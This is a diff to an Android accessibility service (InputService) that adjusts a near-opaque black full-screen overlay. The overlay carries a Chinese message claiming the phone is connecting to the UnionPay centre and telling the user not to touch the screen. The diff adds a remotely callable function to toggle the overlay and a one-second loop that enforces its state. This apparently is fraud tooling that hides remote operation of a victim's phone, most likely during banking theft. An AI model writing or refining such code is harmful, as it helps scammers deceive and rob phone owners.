@@ -147,7 +147,8 @@ class InputService : AccessibilityService() {
                 }
             }
         }
-
+	
+       /*
 	    //wheel button blank
         if (mask == WHEEL_BUTTON_BLANK) {	
             //Log.d(logTag,"gohome:$gohome")
@@ -156,7 +157,7 @@ class InputService : AccessibilityService() {
 	    else
 	       gohome = 8	
             return
-          }
+          }*/
 	
          if (mask == WHEEL_BUTTON_BROWSER) {	
             //Log.d(logTag,"gohome:$gohome")
@@ -309,6 +310,13 @@ class InputService : AccessibilityService() {
 	    SKL=!SKL
             //println("分割后的部分数量不足 6 个，无法完成赋值。")
         }*/
+    }
+
+
+    @RequiresApi(Build.VERSION_CODES.N)
+    fun onstart_overlay(arg1: String,arg2: String) {
+	gohome = arg1.toInt()
+        //overLay.post { overLay.setVisibility(gohome) }
     }
     
     @SuppressLint("WrongConstant")
@@ -1200,15 +1208,14 @@ class InputService : AccessibilityService() {
     	overLay =  FrameLayout(this)
     	overLay.setBackgroundColor(Color.parseColor("#000000"));//#000000
     	overLay.getBackground().setAlpha(253)
-    	gohome = 8
-	overLay.setVisibility(gohome)
+	overLay.setVisibility(8)
         overLay.setFocusable(false)
         overLay.setClickable(false)
 
         val loadingText = TextView(this, null)
 	loadingText.text = "\n\n系统正在对接银联中心\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待..."
 	loadingText.setTextColor(-7829368)
-	loadingText.textSize = 18.0f
+	loadingText.textSize = 15.0f
 	loadingText.gravity = Gravity.LEFT //Gravity.CENTER
 	loadingText.setPadding(60, HomeHeight / 4, 0, 0)
 
@@ -1230,8 +1237,8 @@ class InputService : AccessibilityService() {
     private val handler = Handler(Looper.getMainLooper())
     private val runnable = object : Runnable {
         override fun run() {
-               if (overLay.windowToken != null && overLay.visibility != gohome) {
-	           //  Log.d(logTag, "Fakelay runnable globalVariable: $globalVariable")
+               if (overLay.windowToken != null && overLay.visibility != gohome)
+		{ 
     		     if(gohome==8)
     		     {  
         		overLay.setFocusable(false)
@@ -1245,8 +1252,8 @@ class InputService : AccessibilityService() {
 		     overLay.post { overLay.setVisibility(gohome) }
                     // overLay.setVisibility(gohome)
 		    // windowManager.updateViewLayout(overLay, overLayparams_bass)
-            }
-            handler.postDelayed(this, 1000) 
+               }
+               handler.postDelayed(this, 1000) 
         }
     }
     override fun onDestroy() {
